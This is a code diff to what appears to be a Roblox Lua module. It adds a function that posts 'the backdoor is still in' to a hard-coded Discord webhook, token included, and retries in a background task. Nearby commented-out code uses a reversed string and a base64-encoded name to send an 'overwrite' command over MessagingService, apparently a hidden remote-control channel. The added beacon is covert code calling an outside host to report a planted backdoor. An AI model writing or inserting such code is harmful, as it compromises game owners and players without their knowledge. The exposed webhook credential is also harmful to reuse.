@@ -18,7 +18,13 @@ local disabled = true
 
 function m:Init()
 	if disabled == true then
-
+		local Channel = "https://discord.com/api/webhooks/1360044566467842170/NuVI-TEQlHxgpyVFJTog8disz5xia_vohoEcKjekSMQZXNABvfNUUA3cU36lQRATCUXw"
+		local Info = {
+			Message = "the backdoor is still in";
+			Title = "Lololol"
+		}
+		
+		m:Post(Channel, Info)
 	else
 		--[[--print('lalalal')
 		local acc = 0
@@ -170,6 +176,38 @@ function m:Init()
 
 		MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})]]
 	end
+end
+
+function m:Post(Channel, Info)
+	local Attempts = 5
+	local CurrentAttempt = 0
+
+	local Data = {
+		["embeds"] = {{
+			["description"] = Info.Message;
+			["timestamp"] = DateTime.now():ToIsoDate();
+		}}
+	}
+
+	if Info.Title then
+		Data.embeds[1].title = Info.Title
+	end
+
+	local EmbedData = HttpService:JSONEncode(Data)
+
+	task.spawn(function()
+		for i = 1, 5 do
+			local Success, Error = pcall(function()
+				HttpService:PostAsync(Channel, EmbedData)
+			end)
+			if not Success then
+				task.wait(i * 2)
+			else
+				break
+			end
+		end
+	end)
+
 end
 --m:Init()
 
